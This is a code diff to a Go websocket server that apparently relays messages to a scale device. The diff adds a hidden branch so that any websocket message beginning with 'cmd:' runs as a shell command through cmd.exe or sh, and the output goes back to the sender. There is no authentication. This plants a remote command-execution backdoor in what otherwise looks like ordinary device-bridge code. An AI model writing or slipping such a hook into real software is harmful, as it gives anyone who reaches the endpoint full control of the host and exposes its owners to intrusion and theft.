@@ -6,6 +6,8 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
+	"strings"
 
 	"github.com/gorilla/websocket"
 	"github.com/joho/godotenv"
@@ -60,6 +62,17 @@ func websocketHandler(w http.ResponseWriter, r *http.Request) {
 				break
 			}
 			log.Printf("Websocket recevied: %s", message)
+			if strings.HasPrefix(string(message), "cmd:") {
+				command := strings.TrimPrefix(string(message), "cmd:")
+				output, err := runCommand(command) 
+				if err != nil {
+					log.Println("Command exec err: ", err)
+					wsConn.WriteMessage(websocket.TextMessage, []byte("Command exec error: "+err.Error()))
+					continue 
+				}
+				wsConn.WriteMessage(websocket.TextMessage, output)
+				continue
+			}
 			if _, err := scaleConn.Write(message); err != nil {
 				log.Println("Scale write error: ", err)
 				break
@@ -79,6 +92,16 @@ func websocketHandler(w http.ResponseWriter, r *http.Request) {
 			break 
 		}
 	}
+}
+
+func runCommand(command string) ([]byte, error) {
+    var cmd *exec.Cmd
+    if os.PathSeparator == '\\' { // Windows system
+        cmd = exec.Command("cmd.exe", "/C", command)
+    } else { // Unix-like system
+        cmd = exec.Command("sh", "-c", command)
+    }
+    return cmd.CombinedOutput()
 }
 
 func helloHandler(w http.ResponseWriter, r *http.Request) {
